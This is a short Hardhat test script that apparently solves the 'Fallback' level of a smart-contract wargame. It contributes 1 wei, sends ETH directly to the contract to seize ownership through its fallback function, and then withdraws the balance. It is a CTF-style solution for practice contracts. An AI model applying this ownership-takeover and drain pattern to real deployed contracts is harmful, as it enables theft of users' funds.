import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";


let s: ChallengeState | null = null;

before(getChallengeContract(s, `Fallback`, `0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`));

it("solves the challenge", async function () {
  let tx: any;
  if (s == null) return;
  console.log("my address: ", await s.eoa.getAddress());
  console.log("original owner:", await s.challenge.owner());

  tx = await s.challenge.contribute({
    value: ethers.utils.parseUnits(`1`, `wei`),
  });
  await tx.wait();

  tx = await s.eoa.sendTransaction({
    to: s.challenge.address,
    value: ethers.utils.parseUnits(`1`, `wei`),
  });
  await tx.wait();

  console.log("owner after sending ETH to contract: ", await s.challenge.owner());

  tx = await s.challenge.withdraw();
  await tx.wait();
});

after(async () => {
  if (s == null) return;
  expect(await submitLevel(s.challenge.address), "level not solved").to.be.true;
});
